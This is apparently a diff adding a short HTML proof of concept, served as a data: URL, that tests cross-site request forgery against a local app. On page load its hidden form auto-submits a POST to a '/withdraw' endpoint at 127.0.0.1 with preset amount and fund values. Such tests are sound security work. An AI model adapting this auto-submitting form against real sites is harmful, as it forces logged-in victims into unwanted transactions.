@@ -1,0 +1,21 @@
+
+
+
+data:text/html,<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Test</h1>
+    <form id="csrfForm" action="http://127.0.0.1:5000/withdraw" method="POST">
+        <input type="hidden" name="amount" value="1">
+        <input type="hidden" name="fund" value="2">
+    </form>
+    <script>
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        }
+    </script>
+</body>
+</html>
